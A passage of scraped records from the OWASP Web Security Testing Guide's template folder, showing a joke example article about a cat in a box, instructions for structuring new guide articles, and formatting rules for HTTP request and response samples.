32x32\n    'block_6_expand_relu',   # 16x16\n    'block_13_expand_relu',  # 8x8\n    'block_16_project',      # 4x4\n]\nlayers = [base_model.get_layer(name).output for name in layer_names]\n\n# Create the feature extraction model\ndown_stack = tf.keras.Model(inputs=base_model.input, outputs=layers)\n\ndown_stack.trainable = False\n```\n\nIf you observe a cat on the video feed, it is highly likely that there is a cat in the box.\n\n## Capture Output Including a Cat\n\nHere is some appropriately abbreviated capture output that includes a cat.\n\n```http\n HTTP/1.1 200\n [...]\n <!DOCTYPE html>\n <html lang=\"en\">\n     <head>\n         <meta charset=\"UTF-8\" />\n         <title>Apache Tomcat/10.0.4\n [...]\n ```\n\n## Related Test Cases\n\n- [Template Explanation](2-Template_Explanation.md)\n- [Formatting for HTTP Requests and Responses](3-Format_for_HTTP_Request_Response.md)\n\n## Remediation\n\nDo not make a habit of putting cats in boxes. Keep boxes away from cats as much as possible.\n\n## Tools\n\n- The box\n- A camera\n\n## References\n\n- [Schrödinger's cat](https://en.wikipedia.org/wiki/Schr%C3%B6dinger%27s_cat)\n", "timestamp": "2025-10-24T11:40:02.919361"}
{"source": "github", "repo": "OWASP/wstg", "file": "template/999-Foo_Testing/2-Template_Explanation.md", "url": "https://github.com/OWASP/wstg/blob/master/template/999-Foo_Testing/2-Template_Explanation.md", "content": "# Article Template Explanation\n\n|ID          |\n|------------|\n|WSTG-FOO-002|\n\n## How to Name Your File\n\nThe filename format is:\n\n`<number>-Article_Name.md`\n\nTo name your file:\n\n- Replace `<number>` with the appropriate integer. If you are unsure which section your article belongs in, post a comment in your [new content issue](https://github.com/OWASP/wstg/issues?q=is%3Aopen+is%3Aissue+label%3ANew) asking for input.\n- Write the article name in title case spaced with underscores for better URL encoding. If the article is titled, \"Testing Foo Bypass in Bars\" the filename component is: `Testing_Foo_Bypass_in_Bars` (with a hyphen separating the `<number>` from the title).\n\n## Article Sections\n\nThe remainder of this document explains each section in the [article example](1-Testing_for_a_Cat_in_a_Box.md).\n\n## Title\n\nThe first line of the document is a title at level H1. Followed by a Markdown table that includes the ID of the testing scenario. For example:\n\n```md\n|ID          |\n|------------|\n|WSTG-FOO-002|\n```\n\n## Summary\n\nFully describe the reason for the test. Name specific vulnerabilities. Give the background information necessary for a reader with basic technical expertise. Explain terminology and abbreviations. See the [style guide](../../style_guide.md) for more.\n\n## Test Objectives\n\nUse an [active voice](../../style_guide.md#active-voice) to describe the goal of the test.\n\n## How to Test\n\nProvide specific instructions for performing one or more tests that satisfy the stated objective above. Use individual headings for different tests or methods. Be concise and complete. Use code snippets or images where necessary.\n\n## Remediation\n\nGive a short overview of preventative measures. You may use bullet points. Provide leads to solutions that the reader can follow, but do not try to describe the entire solution itself. Remediation is outside the scope of the testing guide project.\n\nAvoid duplicating content from other OWASP projects. Provide inline links to outside content as needed. Consider the following OWASP resources: [Application Security Verification Standard (ASVS)](https://github.com/OWASP/ASVS), [Top 10](https://github.com/OWASP/Top10), [Proactive Controls](https://owasp.org/www-project-proactive-controls/), or the [Cheat Sheet Series](https://cheatsheetseries.owasp.org).\n\n## References\n\nIf the article contains information sourced from other documents that you could not gracefully link inline, include them here in a bulleted list of links.\n", "timestamp": "2025-10-24T11:40:02.998553"}
{"source": "github", "repo": "OWASP/wstg", "file": "template/999-Foo_Testing/3-Format_for_HTTP_Request_Response.md", "url": "https://github.com/OWASP/wstg/blob/master/template/999-Foo_Testing/3-Format_for_HTTP_Request_Response.md", "content": "# Formatting for HTTP Requests and Responses\n\n|ID          |\n|------------|\n|WSTG-FOO-003|\n\n## How to Include HTTP Request or Response Blocks\n\nTo use examples of HTTP requests and responses in an article, use [raw HTTP messages](https://tools.ietf.org/html/rfc2616) with the `http` Markdown code block language:\n\n```markdown\n    ```http\n    Place request or response capture here\n    ```\n```\n\n- Try to keep the blocks small.\n- Use brackets and ellipsis `[...]` to show that the message is truncated if it helps the clarity of the article.\n\nThe following section is a sample article snippet with HTTP messages and a description of the formatting.\n\n## Example HTTP Request and Response\n\nIf the tester sends the following HTTP Request for the home page:\n\n```http\nGET / HTTP/1.1\nHost: localhost:8080\n```\n\nCheck if the response shows information about the server:\n\n```http\nHTTP/1.1 200\n[...]\n<!DOCTYPE html>\n<html lang=\"en\">\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>Apache Tomcat/10.0.4\n[...]\n```\n\nIn this result, the response identifies the server as Tomcat 10.0.4.\n\n## Example Explanation\n\n- The HTTP request and response have text describing them to the reader before the request and response.\n- The GET request has the smallest amount of headers to have the desired response from the server.\n    - For example, there is no `User-Agent:` as it is not needed for the \"test case\".\n- The article uses brackets and ellipsis `[...]` to cut out unnecessary parts of the response.\n    - Unnecessary response content for this sample includes the `Content-Type:` header and the rest of the HTML in the body.\n", "timestamp": "2025-10-24T11:40:03.078367"}
{"source": "github", "repo": "OWASP/wstg", "file": "template/README.md", "url": "https://github.com/OWASP/wstg/blob/master/template/README.md", "content": "# Test Scenario Template\n\nThis area provides an [example template](999-Foo_Testing/1-Testing_for_a_Cat_in_a_Box.md) and [explanation of that template](999-Foo_Testing/2-Template_Explanation.md) for use in developing guide content. (They are based on fake chapter `999`.)\n\n## Formatting Examples\n\nThis folder also shows how to format specific types of content:\n\n- [HTTP Requests and Responses](999-Foo_Testing/3-Format_for_HTTP_Request_Response.md)\n", "timestamp": "2025-10-24T11:40:03.394005"}
